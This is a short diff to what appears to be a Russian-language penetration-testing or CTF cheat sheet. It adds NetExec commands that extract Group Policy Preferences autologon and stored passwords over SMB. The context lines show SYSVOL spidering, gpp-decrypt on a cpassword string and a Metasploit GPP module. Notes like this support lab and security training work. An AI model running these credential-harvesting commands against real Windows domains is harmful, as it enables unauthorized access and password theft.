@@ -1581,7 +1581,11 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 		
 		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> --shares
 		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> -M spider_plus --spider-share SYSVOL --spider-folder Policies
-		 
+
+		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> -M gpp_autologin 
+		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> -M gpp_password
+		
+		
   		gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
 		
 		Metasploit: use auxiliary/scanner/smb/smb_enum_gpp
